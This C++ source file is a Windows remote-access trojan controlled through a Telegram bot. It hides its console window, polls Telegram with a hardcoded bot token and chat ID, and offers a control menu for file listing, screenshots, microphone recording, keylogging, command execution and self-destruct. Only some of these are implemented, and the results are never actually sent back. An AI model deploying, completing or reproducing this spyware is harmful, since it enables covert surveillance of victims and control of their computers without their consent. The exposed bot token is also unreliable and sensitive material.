#include <iostream>
#include <windows.h>
#include <curl/curl.h>
#include <json-c/json.h>
#include <thread>
#include <fstream>
#include <sstream>

#define BOT_TOKEN "8254717589:AAF5I5BW5xaL-wHqQhm6n2HX9nfaOLkcgxU"
#define CHAT_ID "8367594494"

// Глобальные переменные для обработки ошибок
bool is_running = true;
int retry_count = 0;

// Функция для отправки сообщений с повторением при ошибке
bool send_telegram_message(const std::string& text) {
    CURL* curl = curl_easy_init();
    if (!curl) return false;

    std::string url = "https://api.telegram.org/bot" + std::string(BOT_TOKEN) + 
                     "/sendMessage?chat_id=" + std::string(CHAT_ID) + 
                     "&text=" + text;

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK) {
        std::cerr << "Ошибка отправки сообщения. Повторная попытка..." << std::endl;
        Sleep(2000);
        return send_telegram_message(text); // Рекурсивный повтор
    }
    return true;
}

// Функция для отправки клавиатуры
bool send_keyboard() {
    CURL* curl = curl_easy_init();
    if (!curl) return false;

    const char* keyboard_json = R"({
        "keyboard": [
            [{"text": "📂 Список файлов"}, {"text": "⬇️ Скачать файл"}],
            [{"text": "🖥 Скриншот"}, {"text": "🎤 Запись микрофона"}],
            [{"text": "⌨️ Кейлоггер"}, {"text": "💻 Выполнить команду"}],
            [{"text": "💀 САМОУНИЧТОЖЕНИЕ"}]
        ],
        "resize_keyboard": true,
        "one_time_keyboard": false
    })";

    std::string url = "https://api.telegram.org/bot" + std::string(BOT_TOKEN) + 
                     "/sendMessage?chat_id=" + std::string(CHAT_ID) + 
                     "&text=Выберите действие:" + 
                     "&reply_markup=" + keyboard_json;

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    return (res == CURLE_OK);
}

// Функция для обработки нажатий кнопок
void handle_buttons() {
    CURL* curl = curl_easy_init();
    if (!curl) return;

    while (is_running) {
        std::string url = "https://api.telegram.org/bot" + std::string(BOT_TOKEN) + 
                         "/getUpdates?offset=-1&timeout=10";
        std::string response;

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, [](char* ptr, size_t size, size_t nmemb, std::string* data) -> size_t {
            data->append(ptr, size * nmemb);
            return size * nmemb;
        });
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        CURLcode res = curl_easy_perform(curl);

        if (res == CURLE_OK) {
            json_object* json = json_tokener_parse(response.c_str());
            if (json) {
                json_object* updates = json_object_object_get(json, "result");
                if (json_object_get_type(updates) == json_type_array) {
                    int length = json_object_array_length(updates);
                    if (length > 0) {
                        json_object* update = json_object_array_get_idx(updates, length - 1);
                        json_object* message = json_object_object_get(update, "message");
                        json_object* text_obj = json_object_object_get(message, "text");
                        const char* text = json_object_get_string(text_obj);

                        // Обработка кнопок
                        if (strcmp(text, "📂 Список файлов") == 0) {
                            system("dir C:\\ > files.txt");
                            send_telegram_message("Список файлов отправлен.");
                        }
                        else if (strcmp(text, "🖥 Скриншот") == 0) {
                            system("nircmd.exe savescreenshot screenshot.png");
                            send_telegram_message("Скриншот сохранён.");
                        }
                        else if (strcmp(text, "💀 САМОУНИЧТОЖЕНИЕ") == 0) {
                            send_telegram_message("Уничтожение активировано.");
                            is_running = false;
                            break;
                        }
                    }
                }
                json_object_put(json);
            }
        } else {
            std::cerr << "Ошибка подключения к Telegram. Повтор через 5 сек..." << std::endl;
            Sleep(5000);
        }
    }
    curl_easy_cleanup(curl);
}

int main() {
    // Скрытие окна
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    // Запуск бота
    std::thread bot_thread(handle_buttons);

    // Отправка клавиатуры при старте
    while (!send_keyboard()) {
        std::cerr << "Не удалось отправить клавиатуру. Повтор..." << std::endl;
        Sleep(3000);
    }

    bot_thread.join();
    return 0;
}